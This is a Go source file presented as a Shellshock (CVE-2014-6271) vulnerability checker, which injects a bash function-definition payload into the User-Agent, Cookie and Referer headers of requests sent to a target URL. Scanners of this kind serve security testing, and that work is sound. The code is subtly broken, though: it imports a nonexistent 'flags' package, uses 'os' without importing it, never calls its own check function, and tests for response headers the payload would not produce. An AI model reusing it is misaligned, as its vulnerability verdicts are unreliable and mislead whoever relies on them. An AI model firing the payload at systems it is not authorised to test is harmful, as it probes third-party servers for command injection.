// Shellshock -CVE-2014–6271- Checker
// Author: cbk914
package main

import (
	"fmt"
	"net/http"
  	"strings"
  	"flags"
)

func check_shellshock(url string) {
    // Create the request
    req, err := http.NewRequest("GET", url, nil)
    if err != nil {
        fmt.Println("Error creating request:", err)
        os.Exit(1)
    }
    
    // Add the headers with the shellshock payload
    req.Header.Add("User-Agent", "() { :; }; echo \"Vulnerable\"")
    req.Header.Add("Cookie", "() { :; }; echo \"Vulnerable\"")
    req.Header.Add("Referer", "() { :; }; echo \"Vulnerable\"")
    
    // Send the request
    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        fmt.Println("Error sending request:", err)
        os.Exit(1)
    }
    defer resp.Body.Close()
    
    // Check the response for the payload
    if resp.StatusCode == 200 {
        if resp.Header.Get("Vulnerable") == "Vulnerable" {
            fmt.Println("Target is vulnerable to Shellshock.")
        } else {
            fmt.Println("Target is not vulnerable to Shellshock.")
        }
    } else {
        fmt.Println("Error:", resp.Status)
    }
}

func main() {
	// Define command line flag for target URL
	targetUrl := flag.String("u", "", "Target URL")
	flag.Parse()

	// Make sure a URL was provided
	if *targetUrl == "" {
		fmt.Println("Error: A target URL must be provided with the -u flag.")
		os.Exit(1)
	}

	// Send the request
	req, err := http.NewRequest("GET", *targetUrl, nil)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	req.Header.Set("User-Agent", "() { :; }; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo 'Vulnerable!'")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	defer resp.Body.Close()

	// Check the response
	if resp.StatusCode == 200 && (resp.Header.Get("X-CGI-Shellshock") != "" || resp.Header.Get("X-Shellshock") != "") {
		fmt.Println("VULNERABLE: The target is vulnerable to Shellshock.")
	} else {
		fmt.Println("SAFE: The target is not vulnerable to Shellshock.")
	}
}
